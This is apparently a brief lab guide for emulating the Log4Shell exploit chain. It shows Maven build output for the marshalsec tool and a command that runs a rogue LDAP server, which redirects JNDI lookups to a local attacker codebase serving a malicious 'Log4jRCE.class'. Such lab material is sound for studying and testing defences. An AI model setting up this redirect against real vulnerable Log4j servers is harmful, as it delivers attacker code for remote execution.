## This is to emulate the rogue LDAP server, which redirect a look up to a code repository which contains code

1. Compile & package into jar

<pre>
$ mvn clean package -DskipTests
[INFO] Scanning for projects...
[INFO]
[INFO] ----------------< org.eenterphace.mbechler:marshalsec >-----------------
[INFO] Building marshalsec 0.0.3-SNAPSHOT
[INFO] --------------------------------[ jar ]---------------------------------
Downloading from central: https://repo.maven.apache.org/maven2/org/apache/maven/
plugins/maven-surefire-plugin/2.19.1/maven-surefire-plugin-2.19.1.pom
...
...\target\marshalsec-0.0.3-SNAPSHOT-all.jar
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  06:02 min
[INFO] Finished at: 2022-02-22T00:33:48+08:00
[INFO] ------------------------------------------------------------------------
</pre>

2. Run the rogue LDAP server. 
Any request to this LDAP will be forwarded to the attacker codebase which has malicious
<pre>
$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
Listening on 0.0.0.0:1389
Send LDAP reference result for Log4jRCE redirecting to http://127.0.0.1:8888/Log4jRCE.class
Send LDAP reference result for Log4jRCE redirecting to http://127.0.0.1:8888/Log4jRCE.class
</pre>